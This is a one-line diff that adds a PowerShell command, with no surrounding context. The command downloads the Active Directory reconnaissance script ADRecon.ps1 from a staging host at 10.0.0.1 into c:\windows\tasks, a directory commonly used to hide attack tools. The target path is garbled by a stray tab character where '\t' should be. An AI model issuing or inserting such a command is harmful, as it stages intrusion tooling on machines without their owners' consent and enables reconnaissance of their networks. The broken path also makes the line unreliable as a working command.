@@ -1,0 +1,1 @@
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.0.0.1/tools/ADRecon.ps1','c:\windows	asks\ADRecon.ps1')
